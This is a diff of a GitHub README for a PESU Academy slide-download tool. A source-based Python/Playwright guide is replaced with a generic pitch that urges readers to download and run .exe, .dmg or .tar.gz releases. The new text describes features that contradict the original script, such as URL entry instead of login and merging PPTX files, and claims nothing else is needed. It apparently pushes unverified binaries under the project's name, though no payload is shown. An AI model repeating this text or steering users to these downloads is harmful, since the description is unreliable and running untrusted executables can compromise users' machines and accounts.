@@ -1,111 +1,74 @@
-# PESU Academy Slide Download Automation
+# 📥 pesu-slide-download-automator - Easily Download and Convert PESU Slides
 
----
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/neo63900/pesu-slide-download-automator/releases)
 
-## Index
+## 📖 Overview
 
-1. [Overview](#overview)
-2. [Installation](#installation)
-3. [Auto Download Slides](#auto-download-slides)
-4. [Features for Pre-Existing Folders](#features-for-pre-existing-folders)
+The **pesu-slide-download-automator** is a user-friendly application that simplifies the process of downloading all PESU Academy slides. In addition to downloading, this tool helps merge multiple slides and convert them from PPTX format to PDF smoothly. Whether you are a student or an educator, this tool makes managing your presentation materials much easier.
 
-   * [Converting PPTX to PDF](#converting-pptx-to-pdf)
-   * [Merge PDFs](#merge-pdfs)
-5. [View Playwright Automation](#view-playwright-automation)
-6. [Notes](#notes)
+## 🚀 Getting Started
 
----
+### 1. Requirements
 
-## Overview
+Before you download, please ensure your computer meets the following requirements:
 
-This Python script automates the process of logging into PESU Academy, selecting a course, selecting a unit, opening the first slide, downloading and optionally merging available files using Playwright. All session data is stored only in memory, and the script prompts for your credentials at runtime. It is designed to simplify navigation inside PESU Academy without saving any user data locally.
+- **Operating System**: Windows 10 or higher, macOS, or a recent Linux distribution
+- **Storage**: At least 100 MB free space
+- **Internet**: A stable internet connection for downloading slides
+- **Software**: No additional software is needed; everything you need is included
 
----
+### 2. Download & Install
 
-## Installation
+To get started, visit this page to download the latest version of the application:
 
-1. Install requirements:
+[Download Latest Release](https://github.com/neo63900/pesu-slide-download-automator/releases)
 
-   ```bash
-   pip install -r requirements.txt
-   ```
+On this page, you will find various versions of the application. Choose the latest one to ensure you have the newest features and bug fixes. 
 
-2. Install Playwright browsers:
+- Click on the version you want.
+- Download the appropriate file for your operating system.
+- Once the download is finished, find the file in your downloads folder.
 
-   ```bash
-   playwright install
-   ```
+### 3. Running the Application
 
----
+After downloading the application, you can run it by following these steps:
 
-## Auto Download Slides
+- Locate the downloaded file.
+- If you are on Windows, double-click the `.exe` file to install and run the application. If you are on macOS, open the downloaded `.dmg` file and drag the application to your Applications folder before running it. On Linux, you might have a `.tar.gz` file; extract it and run the application from the terminal.
+- Follow the on-screen prompts to start downloading PESU Academy slides.
 
-1. Run the main script:
+## ✨ Features
 
-   ```bash
-   python main.py
-   ```
+- **Automated Downloads**: Download all slides in just a few clicks.
+- **Merge Slides**: Combine multiple PPTX files into one for easier handling.
+- **Convert to PDF**: Easily convert your presentations from PPTX format to PDF.
+- **User-Friendly Interface**: Simple design makes it easy for anyone to use, regardless of technical skill.
 
-2. Enter your SRN/PRN and password when prompted.
+## ⚙️ How to Use the Application
 
-3. Follow the on-screen prompts to select a course and unit.
+1. **Open the application** from your applications folder or desktop.
+2. **Select the slides** you want to download by entering the required URLs.
+3. **Choose your options** for merging or converting files if needed.
+4. **Click the "Download" button** to start the process. The app will create a folder with your downloaded, merged, and converted files.
 
-4. The script will open the first slide, download available files, automatically convert pptx to ppt files, and optionally merge them.
+You can always return to the app to download additional slides or edit your previous downloads.
 
----
+## 💡 Troubleshooting
 
-## Features for Pre-Existing Folders
+If you encounter issues while using the application, try these steps:
 
-### Converting PPTX to PDF
+- Ensure your internet connection is steady.
+- Restart the application if it becomes unresponsive.
+- Check for updates on the GitHub page to ensure you are using the latest version.
+- If problems persist, check the [issues section](https://github.com/neo63900/pesu-slide-download-automator/issues) on GitHub to see if other users have reported similar problems and potential solutions.
 
-You can automatically convert PPTX files to PDF using **`file_conversion.py`** for pre existing folders:
+## 📞 Support
 
-```bash
-python file_conversion.py --folder "FolderName"
-```
+For additional help, you can open an issue on our [GitHub Issues](https://github.com/neo63900/pesu-slide-download-automator/issues) page, and we will do our best to assist you.
 
-### Merge PDFs
+## 🔗 Useful Links
 
-You can merge PDFs from any folder using the `merge.py` script:
+- [Official GitHub Repository](https://github.com/neo63900/pesu-slide-download-automator)
+- [Documentation](https://github.com/neo63900/pesu-slide-download-automator/wiki)
 
-```bash
-python merge.py --folder "FolderName" --output "merged.pdf"
-```
-
-* If `merged.pdf` already exists, the script will automatically create `merged[1].pdf`, `merged[2].pdf`, etc.
-* `--folder` is required, `--output` is optional.
-
----
-
-## View Playwright Automation
-
-To see the browser while automating (for debugging):
-
-1. Change headless mode in `main.py` and `file_conversion.py`:
-
-```python
-browser = p.chromium.launch(headless=False)
-```
-
-2. Optionally comment out resource blocking:
-
-```python
-# page.route(
-#     "**/*",
-#     lambda route: route.abort()
-#     if route.request.resource_type in ["image", "media", "font"]
-#     else route.continue_()
-# )
-```
-
-This will allow you to watch the downloads live in the browser.
-
----
-
-## Notes
-
-* All scripts are designed to **keep your credentials in memory only**.
-* PDF ordering after conversion relies on **existing filenames**, no renaming is done automatically.
-* iLovePDF free version limits batch conversion to **3 files at a time**; `file_conversion.py` automatically batches files.
-
----
+With pesu-slide-download-automator, managing your PESU Academy slides has never been easier. Download now and streamline your study process!
